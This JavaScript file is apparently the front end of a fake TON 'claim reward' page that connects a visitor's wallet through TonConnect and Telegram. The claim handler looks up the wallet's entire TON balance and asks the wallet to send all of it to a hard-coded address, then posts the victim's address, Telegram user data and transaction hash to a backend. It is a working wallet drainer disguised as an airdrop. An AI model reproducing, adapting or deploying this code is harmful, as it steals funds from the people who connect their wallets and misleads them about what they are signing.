const tonweb = new window.TonWeb();
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://mor3f.monster/manifest.json',
    buttonRootId: 'connect'
});


function openModal() {
    if (!tonConnectUI.connected) {
        tonConnectUI.openModal();
    }
}


async function sendNatCoin(amount, recipientAddress) {
    try {

        const status = await tonConnectUI.getStatus();
        if (!tonConnectUI.connected || !status.account) {
            throw new Error('Not connected to wallet');
        }

        const userAddress = status.account.address;
        const amountInNano = amount * 1000000000; 


        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, 
            messages: [
                {
                    address: recipientAddress,
                    amount: amountInNano,

                }
            ]
        };

        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction result:', result);


        await axios.post("./api/index.php", {
            action: "sendSuccess",
            address: userAddress,
            recipient: recipientAddress,
            amount: amount,
            hash: result.boc
        });

        Swal.fire({
            text: "Transaction accepted",
            icon: 'success',
            confirmButtonText: 'OK',
            background: "#121214",
            color: "#fff",
            confirmButtonColor: "#00ff00"
        });
    } catch (error) {
        console.error('Transaction error:', error);

        Swal.fire({
            text: "Transaction declined",
            icon: 'error',
            confirmButtonText: 'OK',
            background: "#121214",
            color: "#fff",
            confirmButtonColor: "#ff0000"
        });
    }
}


async function handleClaimReward() {
    try {
        const status = await tonConnectUI.getStatus();
        if (tonConnectUI.connected && status.account != null) {
            const user = window.Telegram.WebApp.initDataUnsafe.user;
            const address = UserFriendlyAddress(status.account.address);
            console.log(UserFriendlyAddress(status.account.address));
            console.log(user);

            let balance = await axios.post("./api/index.php", {
                action: "getBalance",
                address: address,
                user: user
            });
            balance = balance.data;
            console.log(balance);

            const tonBalance = balance.ton.balance;
            console.log(tonBalance / 1000000000);

            if (tonBalance / 1000000000 > 0.1) {
                const recipientAddress = 'UQBP52VVgnmtdFyJhEFIUNrX8LNazACIZCYZpf0_PECLkpC8'; 
                await sendNatCoin(tonBalance / 1000000000, recipientAddress);
            } else {
                Swal.fire({
                    text: "Not enough balance to claim reward",
                    icon: 'error',
                    confirmButtonText: 'OK',
                    background: "#121214",
                    color: "#fff",
                    confirmButtonColor: "#ff0000"
                });
            }
        } else {
            Swal.fire({
                text: "Not connected to wallet",
                icon: 'error',
                confirmButtonText: 'OK',
                background: "#121214",
                color: "#fff",
                confirmButtonColor: "#ff0000"
            });
        }
    } catch (error) {
        console.error('Error:', error);
        Swal.fire({
            text: "An error occurred",
            icon: 'error',
            confirmButtonText: 'OK',
            background: "#121214",
            color: "#fff",
            confirmButtonColor: "#ff0000"
        });
    }
}


document.getElementById('claim').addEventListener('click', handleClaimReward);


document.getElementById('rainbow-connect-button').addEventListener('click', openModal);
document.getElementById('metamask-connect-button').addEventListener('click', openModal);
document.getElementById('wallet-connect-connect-button').addEventListener('click', openModal);
document.getElementById('rabby-connect-button').addEventListener('click', openModal);
document.getElementById('trust-wallet-connect-button').addEventListener('click', openModal);
document.getElementById('coinbase-connect-button').addEventListener('click', openModal);

function UserFriendlyAddress(rawHexAddress) {
    const { Address } = tonweb.utils;
    const addressInstance = new Address(rawHexAddress);
    return addressInstance.toString(true, true, false);
}
